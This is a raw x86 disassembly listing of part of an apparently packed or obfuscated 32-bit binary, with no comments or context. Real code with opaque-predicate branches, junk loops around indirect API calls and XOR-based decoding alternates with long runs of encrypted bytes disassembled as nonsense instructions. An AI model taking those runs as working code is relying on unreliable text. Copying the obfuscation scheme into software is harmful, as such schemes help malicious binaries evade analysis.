  407d0d:	je     0x407cf2
  407d0f:	add    cl,dl
  407d11:	cdq    
  407d12:	mov    ebp,0xe84dfed9
  407d17:	outs   dx,DWORD PTR ds:[esi]
  407d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d19:	adc    edx,DWORD PTR [ebp-0x29]
  407d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d1d:	mov    dl,BYTE PTR [ebp-0x1031baa]
  407d23:	mov    esi,0x10d4a7ef
  407d28:	lds    eax,FWORD PTR [edx+0x612829f]
  407d2e:	in     al,dx
  407d2f:	adc    DWORD PTR [ecx-0x10f907d4],esp
  407d35:	into   
  407d36:	fadd   st(0),st
  407d38:	into   
  407d39:	mov    esi,ebp
  407d3b:	shl    BYTE PTR [esi],0xe1
  407d3e:	je     0x407d4f
  407d40:	jg     0x407d40
  407d42:	daa    
  407d43:	or     ah,dl
  407d45:	xor    al,0x1d
  407d47:	in     al,0x11
  407d49:	mov    ecx,0x65486ad2
  407d4e:	fwait
  407d4f:	jns    0x407d44
  407d51:	inc    edi
  407d52:	leave  
  407d53:	cwde   
  407d54:	push   ss
  407d55:	dec    edx
  407d56:	xor    ebp,esi
  407d58:	xchg   ecx,eax
  407d59:	xor    bl,BYTE PTR [edi+0x2f]
  407d5c:	lea    eax,[esi]
  407d5e:	adc    al,0x25
  407d60:	mov    WORD PTR [esi],cs
  407d62:	fistp  DWORD PTR [edi-0x2b9e4844]
  407d68:	sub    esp,eax
  407d6a:	ins    BYTE PTR es:[edi],dx
  407d6b:	test   DWORD PTR [edx],edx
  407d6d:	int3   
  407d6e:	xlat   BYTE PTR ds:[ebx]
  407d6f:	int3   
  407d70:	xchg   edi,eax
  407d71:	or     BYTE PTR [eax-0x4cdc8483],0xd9
  407d78:	pop    edi
  407d79:	call   0x4dc0a435
  407d7e:	jp     0x407d08
  407d80:	ss stos DWORD PTR es:[edi],eax
  407d82:	mov    BYTE PTR [esi+esi*1],dh
  407d85:	and    DWORD PTR [ecx+0x3fed5f03],edx
  407d8b:	lods   al,BYTE PTR ds:[esi]
  407d8c:	mov    esp,0x6f006cad
  407d91:	aam    0xe8
  407d93:	lds    eax,FWORD PTR [ecx+0x23]
  407d96:	aam    0x8a
  407d98:	push   esi
  407d99:	add    DWORD PTR [ebx+0x46],ecx
  407d9c:	les    edi,FWORD PTR [esi+0x6c]
  407d9f:	inc    edi
  407da0:	mov    esi,cs
  407da2:	loop   0x407db9
  407da4:	(bad)  [edx-0x70]
  407da7:	mov    ah,0x22
  407da9:	inc    ecx
  407daa:	pop    eax
  407dab:	xchg   esi,eax
  407dac:	aas    
  407dad:	jb     0x407dfe
  407daf:	fimul  DWORD PTR [eax]
  407db1:	push   ecx
  407db2:	ss loop 0x407d97
  407db5:	imul   eax,DWORD PTR [esi+0x21],0x6
  407db9:	es out 0xc5,al
  407dbc:	sub    esi,DWORD PTR [edx+0x6b90f0df]
  407dc2:	es jno 0x407de7
  407dc5:	xor    eax,0x4a54f407
  407dca:	push   edi
  407dcb:	jge    0x407d8c
  407dcd:	aam    0x65
  407dcf:	cmp    edx,ebx
  407dd1:	scas   al,BYTE PTR es:[edi]
  407dd2:	inc    edx
  407dd3:	xchg   ebp,eax
  407dd4:	cdq    
  407dd5:	mov    edx,0x42903cc1
  407dda:	shl    eax,0x1
  407ddd:	push   es
  407dde:	into   
  407ddf:	ror    al,cl
  407de1:	mov    eax,0x63fc773f
  407de6:	(bad)  
  407de7:	xchg   edi,eax
  407de8:	pop    ds
  407de9:	push   ds
  407dea:	pop    ecx
  407deb:	xor    al,0x37
  407ded:	call   0x3985:0x5ea07ccf
  407df4:	clc    
  407df5:	out    dx,eax
  407df6:	dec    eax
  407df7:	mov    eax,0xe8999cb
  407dfc:	or     ah,cl
  407dfe:	test   DWORD PTR [edx+0x7d42a7c7],0xe70d8399
  407e08:	loopne 0x407dde
  407e0a:	add    BYTE PTR [esi+0x5dfcf025],ch
  407e10:	stos   BYTE PTR es:[edi],al
  407e11:	popa   
  407e12:	out    0x2e,eax
  407e14:	inc    edx
  407e15:	sub    eax,0x542e969e
  407e1a:	push   ds
  407e1b:	int    0x19
  407e1d:	inc    ebp
  407e1e:	out    0xf2,al
  407e20:	pop    ds
  407e21:	aaa    
  407e22:	in     al,0x1d
  407e24:	or     BYTE PTR ds:[ebx+0x75],bh
  407e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e29:	xchg   ecx,eax
  407e2a:	pop    edx
  407e2b:	jl     0x407dcb
  407e2d:	dec    edi
  407e2e:	mov    esi,0x4131cc0
  407e33:	jnp    0x407dbe
  407e35:	popf   
  407e36:	int3   
  407e37:	cdq    
  407e38:	mov    eax,ds:0x88e3e15a
  407e3d:	mov    edx,0xce217cab
  407e42:	mov    ecx,cs
  407e44:	rcr    DWORD PTR [esi+eax*2+0x40fcc361],0x59
  407e4c:	or     DWORD PTR [edi],0x7d
  407e4f:	(bad)  
  407e50:	push   esi
  407e51:	ror    DWORD PTR [esi],0xce
  407e54:	dec    esp
  407e55:	aad    0x41
  407e57:	pop    ebx
  407e58:	xor    eax,0x8c5f6eeb
  407e5d:	daa    
  407e5e:	popf   
  407e5f:	pushf  
  407e60:	ret    0x1089
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xc9f0e20d
  408191:	in     eax,dx
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	(bad)  
  40819c:	add    DWORD PTR [edi],0xb8f0f5a2
  4081a2:	and    DWORD PTR [eax+eiz*1-0x28],0xffffffe7
  4081a7:	xchg   esi,eax
  4081a8:	outs   dx,DWORD PTR ds:[esi]
  4081a9:	jge    0x408221
  4081ab:	xor    BYTE PTR [ecx+esi*4],al
  4081ae:	outs   dx,DWORD PTR ds:[esi]
  4081af:	mul    BYTE PTR [edi+0x35]
  4081b2:	sub    BYTE PTR [ecx-0x562b3bd0],0xe1
  4081b9:	lds    edx,FWORD PTR [eax+0x5e]
  4081bc:	clc    
  4081bd:	test   dh,ch
  4081bf:	jnp    0x408148
  4081c1:	test   BYTE PTR [edx],bl
  4081c3:	cli    
  4081c4:	pop    ebx
  4081c5:	xor    eax,0xd448bdb9
  4081ca:	dec    ebx
  4081cb:	fadd   DWORD PTR [ebx-0x6d6e6d17]
  4081d1:	add    eax,0xd8e979c7
  4081d6:	sub    cl,BYTE PTR [ecx+0x77]
  4081d9:	jns    0x4081c5
  4081db:	call   DWORD PTR [ebx+edi*1-0x269d9993]
  4081e2:	mov    esp,0x224d481e
  4081e7:	push   ecx
  4081e8:	fdiv   st,st(7)
  4081ea:	cmp    al,0x6e
  4081ec:	inc    esp
  4081ed:	fld    QWORD PTR [edx-0x4c6a4c21]
  4081f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f4:	adc    DWORD PTR [edi+0x72],0xffffffdb
  4081f8:	add    edi,esi
  4081fa:	pop    edi
  4081fb:	rcr    ebx,1
  4081fd:	les    ebp,FWORD PTR [esi+0x55]
  408200:	cld    
  408201:	ds and al,0x3a
  408205:	mov    bl,0x6f
  408207:	ret    0x473
  40820a:	mov    ecx,0xde57d465
  40820f:	mov    esp,0x8e48d288
  408214:	or     al,0xa4
  408216:	shr    al,0x94
  408219:	push   ebp
  40821a:	or     al,BYTE PTR [ecx+edi*1-0x25]
  40821e:	enter  0x86c1,0x9
  408222:	mov    eax,ds:0xa59ace78
  408227:	push   ss
  408228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408229:	jg     0x4081eb
  40822b:	mov    esp,0x901e91a1
  408230:	std    
  408231:	add    eax,0xcb3043f8
  408236:	jmp    0xd103f2c6
  40823b:	aad    0x43
  40823d:	sub    DWORD PTR [ebx],edx
  40823f:	or     eax,0x4a1f6d50
  408244:	sub    BYTE PTR [edi],al
  408246:	and    ebx,eax
  408248:	dec    ecx
  408249:	cwde   
  40824a:	xor    cl,BYTE PTR [edi+0x0]
  40824d:	mov    bh,0x4d
  40824f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408250:	shl    BYTE PTR [ecx],0xd0
  408253:	shl    esp,cl
  408255:	sub    ebx,DWORD PTR [ebp-0x5b]
  408258:	dec    ecx
  408259:	call   FWORD PTR [ebx-0x48aecc9d]
  40825f:	xchg   ecx,eax
  408260:	loop   0x408232
  408262:	sub    BYTE PTR ds:[ecx+0x13],dh
  408266:	mov    al,ds:0x5154611f
  40826b:	mov    BYTE PTR [esi-0x21],ah
  40826e:	mov    edi,0x1f816273
  408273:	mov    ah,dh
  408275:	xchg   esi,eax
  408276:	fstp   QWORD PTR [edi]
  408278:	mov    ah,0x5
  40827a:	inc    ecx
  40827b:	pop    esi
  40827c:	fidivr WORD PTR [edx]
  40827e:	jle    0x40820c
  408280:	(bad)
  408284:	push   esi
  408285:	xor    al,BYTE PTR [esi-0x22]
  408288:	xchg   esp,eax
  408289:	jg     0x4082dc
  40828b:	jbe    0x408305
  40828d:	aam    0x51
  40828f:	mov    edx,DWORD PTR [edx+0x7fdc81b8]
  408295:	or     esp,DWORD PTR [ebp+0x7a]
  408298:	push   edx
  408299:	retf   
  40829a:	xor    ecx,0x9027d992
  4082a0:	jbe    0x40829e
  4082a2:	out    0xc6,al
  4082a4:	push   ecx
  4082a5:	and    ebx,DWORD PTR ds:0x497f963e
  4082ab:	xchg   ecx,eax
  4082ac:	push   edx
  4082ad:	xor    eax,0xa0f45b50
  4082b2:	sbb    ebx,edi
  4082b4:	out    dx,al
  4082b5:	out    0xee,al
  4082b7:	mov    edx,0xeb2b00da
  4082bc:	(bad)  [esi-0x3daacca1]
  4082c2:	add    dh,bl
  4082c4:	pushf  
  4082c5:	adc    eax,0xc8981b66
  4082ca:	mov    BYTE PTR [esi-0x56],ah
  4082cd:	pop    ss
  4082ce:	mov    WORD PTR [edx+0x45],gs
  4082d1:	mov    al,ds:0xa0c57824
  4082d6:	bound  esp,QWORD PTR [edi-0x6]
  4082d9:	lods   eax,DWORD PTR ds:[esi]
  4082da:	test   eax,0x4d17cfac
  4082df:	sbb    ecx,edi
  4082e1:	jle    0x408305
  4082e3:	std    
  4082e4:	mov    ebp,DWORD PTR [ebx+0x88a6688]
  4082ea:	(bad)  
  4082ec:	std    
  4082ed:	ficom  DWORD PTR [edx+0x45f559c3]
  4082f3:	and    al,0xb0
  4082f5:	cwde   
  4082f6:	jae    0x408315
  4082f8:	adc    BYTE PTR [edi+0x17],al
  4082fb:	adc    al,0x2c
  4082fd:	add    ebp,DWORD PTR [ebx]
  4082ff:	imul   DWORD PTR [ebx+ebp*2+0x4c]
  408303:	stos   BYTE PTR es:[edi],al
  408304:	and    ecx,DWORD PTR [esi+ebx*2+0x70145786]
  40830b:	shr    edx,cl
  40830d:	ret    
  40830e:	call   0x7644:0xd1d4ed8f
  408315:	loop   0x408306
  408317:	popf   
  408318:	cs cmp eax,0xf1ea7faa
  40831e:	cmp    eax,0x3a6e06cf
  408323:	sbb    bh,BYTE PTR [edi+edi*1]
  408326:	mov    cl,BYTE PTR [ecx-0x339d8b32]
  40832c:	std    
  40832d:	xlat   BYTE PTR ds:[ebx]
  40832e:	leave  
  40832f:	sub    DWORD PTR [eax],ebp
  408331:	je     0x4082ef
  408333:	push   ebx
  408334:	sbb    edi,DWORD PTR [ecx]
  408336:	hlt    
  408337:	imul   ecx,DWORD PTR [edx-0x1e],0x91007ee7
  40833e:	aad    0x1e
  408340:	mov    eax,ds:0x4b505e14
  408345:	fild   QWORD PTR [esi-0x14f08ce6]
  40834b:	or     BYTE PTR [ecx-0x10690f2a],ah
  408351:	nop
  408352:	sahf   
  408353:	pop    es
  408354:	lods   eax,DWORD PTR ds:[esi]
  408355:	xor    al,0xd9
  408357:	or     esi,esi
  408359:	fsubr  QWORD PTR [eax+0xaf21864]
  40835f:	push   edi
  408360:	jbe    0x408357
  408362:	call   DWORD PTR [esi+eiz*4]
  408365:	ud1    edx,DWORD PTR [edi-0x57]
  408369:	add    ecx,esi
  40836b:	pusha  
  40836c:	adc    dl,al
  40836e:	xor    DWORD PTR [esi-0x4e4c30b2],0x5d
  408375:	retf   
  408376:	pop    ecx
  408377:	sbb    DWORD PTR [edi+0x1344d966],0x61
  40837e:	pop    ebp
  40837f:	inc    esi
  408380:	clc    
  408381:	dec    esi
  408382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408383:	scas   al,BYTE PTR es:[edi]
  408384:	and    ah,dh
  408386:	or     ah,BYTE PTR [ebx+ebx*8+0x2]
  40838a:	(bad)  
  40838c:	jmp    0x408325
  40838e:	mov    esi,0x5290aac8
  408393:	sbb    eax,0xa53973a6
  408398:	cmp    cl,BYTE PTR [eax-0x7]
  40839b:	jae    0x408404
  40839d:	je     0x4083ea
  40839f:	rcl    DWORD PTR [ebp+0x1f936822],1
  4083a5:	loop   0x4083ae
  4083a7:	imul   esp,DWORD PTR [eax-0x6137e31b],0xbabb8f2c
  4083b1:	retf   
  4083b2:	adc    dh,BYTE PTR [edx]
  4083b4:	cmp    ecx,DWORD PTR [edi]
  4083b6:	nop
  4083b7:	push   esi
  4083b8:	push   edi
  4083b9:	sub    dl,ch
  4083bb:	and    esi,DWORD PTR [esi+ecx*2-0x2c6b82fc]
  4083c2:	call   0xe0860d48
  4083c7:	and    DWORD PTR ds:0x4337db,0x0
  4083d1:	mov    eax,ds:0x4337db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	jle    0x408491
  408466:	repnz and esp,esp
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x408409
  408471:	loop   0x40842b
  408473:	sar    BYTE PTR [esi],1
  408475:	and    BYTE PTR [edi-0x5a],ch
  408478:	pop    ebx
  408479:	add    bh,cl
  40847b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40847c:	dec    esi
  40847d:	adc    bl,BYTE PTR [edx+eax*8]
  408480:	hlt    
  408481:	mov    DWORD PTR [ecx-0x394d1a06],edx
  408487:	push   0xb7ee187
  40848c:	cwde   
  40848d:	mov    eax,ds:0xc2538f5a
  408492:	inc    esp
  408493:	dec    ebx
  408494:	jmp    0x9951:0xcd09d73c
  40849b:	dec    edi
  40849c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40849d:	push   edx
  40849e:	(bad)  
  40849f:	out    0x12,al
  4084a1:	jmp    0x40842d
  4084a3:	in     eax,dx
  4084a4:	in     al,dx
  4084a5:	or     BYTE PTR [edx-0x1d],0x42
  4084a9:	std    
  4084aa:	loopne 0x4084f1
  4084ac:	dec    eax
  4084ad:	pop    es
  4084ae:	mov    al,ds:0x75bac393
  4084b3:	pushf  
  4084b4:	mov    ah,0x89
  4084b6:	adc    esp,esi
  4084b8:	test   dl,0x86
  4084bb:	loope  0x408494
  4084bd:	stos   BYTE PTR es:[edi],al
  4084be:	mov    eax,0x47a857dc
  4084c3:	test   cl,ch
  4084c5:	out    dx,eax
  4084c6:	imul   ebp,DWORD PTR [ebx+0x5b],0x1de26be2
  4084cd:	dec    ebp
  4084ce:	pop    edi
  4084cf:	adc    eax,0xe7d87a38
  4084d4:	sbb    edi,DWORD PTR [edi+0x670b828d]
  4084da:	mov    ds:0x705f4b04,al
  4084df:	or     eax,0xcb3c5da2
  4084e4:	mov    ds:0x864164e,eax
  4084e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ea:	and    BYTE PTR [edi+ebx*2+0x7b],0xdb
  4084ef:	pop    edx
  4084f0:	sahf   
  4084f1:	and    eax,0xd8a35af
  4084f6:	les    edi,FWORD PTR [eax-0x3]
  4084f9:	pop    ebp
  4084fa:	jecxz  0x408550
  4084fc:	push   ebx
  4084fd:	xchg   ebp,eax
  4084fe:	outs   dx,DWORD PTR ds:[esi]
  4084ff:	jle    0x408580
  408501:	push   0x799d0ac3
  408506:	sbb    ah,BYTE PTR [ecx]
  408508:	sub    eax,0x990defd3
  40850d:	sub    BYTE PTR [edi-0xaedfe29],ah
  408513:	add    eax,0x6a7419f2
  408518:	dec    esp
  408519:	(bad)  
  40851a:	mov    ds:0x407d577a,al
  40851f:	mov    bh,0x87
  408521:	adc    al,0x84
  408523:	jge    0x40856c
  408525:	push   eax
  408526:	aad    0x4c
  408528:	mov    ch,al
  40852a:	jle    0x4084e2
  40852c:	cs in  eax,0x6e
  40852f:	sar    bh,0x50
  408532:	xor    al,0xda
  408534:	sar    BYTE PTR [di+0x79e1],1
  408539:	push   eax
  40853a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40853b:	call   0x2afcd2dd
  408540:	xchg   DWORD PTR [ebp-0x52f8e626],ebx
  408546:	inc    eax
  408548:	shr    DWORD PTR [eax+ebx*1+0x62387dd3],0xaa
  408550:	ret    0x2bdd
  408553:	arpl   si,ax
  408555:	ss inc eax
  408557:	sahf   
  408558:	dec    ecx
  408559:	out    0x36,eax
  40855b:	mov    esp,0xd383a088
  408560:	jge    0x4084ed
  408562:	xchg   edi,ecx
  408564:	add    bl,BYTE PTR [edx+0x37aae812]
  40856a:	lock mov ds:0xa297d7d5,eax
  408570:	mov    al,0x8e
  408572:	in     eax,0xec
  408574:	ins    DWORD PTR es:[edi],dx
  408575:	pcmpgtd mm4,QWORD PTR [ebx-0x3c]
  408579:	mov    ecx,0xdaa09c35
  40857e:	and    bl,dl
  408580:	xor    BYTE PTR [eax+0x57],al
  408583:	mov    BYTE PTR [eax],dh
  408585:	jle    0x408595
  408587:	jl     0x408569
  408589:	ret    0x3658
  40858c:	dec    esi
  40858d:	mov    bl,BYTE PTR [ecx-0x50c719c3]
  408593:	js     0x4085f4
  408595:	aad    0xce
  408597:	in     eax,dx
  408598:	xchg   ecx,eax
  408599:	iret   
  40859a:	out    dx,al
  40859b:	push   edx
  40859c:	mov    edi,0xca1701c9
  4085a2:	ss stc 
  4085a4:	aas    
  4085a5:	std    
  4085a6:	and    bl,0x19
  4085a9:	cdq    
  4085aa:	jp     0x4085a9
  4085ac:	adc    DWORD PTR [edx],esi
  4085ae:	mov    eax,ebp
  4085b0:	loopne 0x40859b
  4085b2:	cwde   
  4085b3:	retf   
  4085b4:	xchg   ebx,eax
  4085b5:	jl     0x40853d
  4085b7:	addr16 adc bh,dl
  4085ba:	push   edx
  4085bb:	dec    ebp
  4085bc:	sub    cl,BYTE PTR [edi-0x74]
  4085bf:	jle    0x408607
  4085c1:	cs push 0x56
  4085c4:	inc    ecx
  4085c5:	xor    eax,0x966eea20
  4085ca:	cwde   
  4085cb:	in     al,0xbd
  4085cd:	xor    BYTE PTR [esi-0x6c736924],dl
  4085d3:	test   al,0xe7
  4085d5:	stos   DWORD PTR es:[edi],eax
  4085d6:	pop    ebp
  4085d7:	enter  0xbd07,0xd3
  4085db:	(bad)  
  4085dc:	pop    ss
  4085dd:	cli    
  4085de:	xor    BYTE PTR [esi],bh
  4085e0:	jns    0x408619
  4085e2:	add    cl,ch
  4085e4:	lods   eax,DWORD PTR ds:[esi]
  4085e5:	in     al,0x0
  4085e7:	mov    edi,0xa96f1562
  4085ec:	in     al,0xf2
  4085ee:	dec    ebp
  4085ef:	popf   
  4085f0:	not    DWORD PTR [esi-0x21]
  4085f3:	jo     0x408612
  4085f5:	dec    esp
  4085f6:	loopne 0x408630
  4085f8:	xchg   ebp,eax
  4085f9:	stos   DWORD PTR es:[edi],eax
  4085fa:	xchg   ebx,eax
  4085fb:	int    0x32
  4085fd:	inc    edi
  4085fe:	ja     0x40860a
  408600:	dec    esi
  408601:	test   DWORD PTR [eax],ebp
  408603:	dec    DWORD PTR [edi+0x17]
  408606:	mov    esi,DWORD PTR [edi+0x4c]
  408609:	xchg   edx,eax
  40860a:	inc    esp
  40860b:	sub    eax,0xe4ef050f
  408610:	arpl   WORD PTR [ebx+ebx*2+0x65485de1],cx
  408617:	mov    al,ds:0x1078ef38
  40861c:	std    
  40861d:	dec    edx
  40861e:	cdq    
  40861f:	xor    esi,DWORD PTR [edx+0x36a9163f]
  408625:	fild   DWORD PTR [edi+0x32]
  408628:	or     eax,0x578de4c0
  40862d:	mov    ebx,0x6bb0e173
  408632:	les    esi,FWORD PTR es:[ebx+0x2acc75f]
  408639:	pop    esp
  40863a:	sub    edi,ebx
  40863c:	jne    0x4085c9
